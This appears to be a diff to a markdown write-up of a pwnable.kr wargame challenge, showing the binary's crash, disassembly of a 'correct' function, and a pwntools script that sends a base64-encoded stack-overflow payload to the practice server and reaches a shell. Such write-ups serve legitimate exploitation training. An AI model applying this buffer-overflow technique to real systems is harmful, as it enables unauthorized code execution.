@@ -1,6 +1,10 @@
+### After downading the binary 
+```
 Authenticate : aaaaaaaaaaaaaaaa --breaks here 
 hash : d3fb4db842861ccc2775253c86899b42
 Segmentation fault (core dumped)
+````
+Next I opened it up to have a little look at it decompiled
 
 
 
@@ -99,8 +103,11 @@ Dump of assembler code for function correct:
    0x08049297 <+56>:	call   0x805a6a0 <exit>
 
 ----
-to exploit this. We need to overwtite the correct functon value 0x08049278. we need to control the EIP(hopefully) time to ovrfloe this. we need to oveflow the EBP and chnge the stack. 
 
+```
+
+To exploit this. We need to overwtite the correct functon value 0x08049278. we need to control the EIP(hopefully) time to ovrfloe this. we need to oveflow the EBP and chnge the stack. 
+```
 from pwn import *
 import base64
 p = remote('pwnable.kr',9003)
@@ -113,7 +120,7 @@ payload = base64.b64encode(payload)
 p.sendline(payload)
 p.recvline()
 p.interactive()
-
+```
 Opening connection to pwnable.kr on port 9003: Done
 [*] Switching to interactive mode
 $ ls
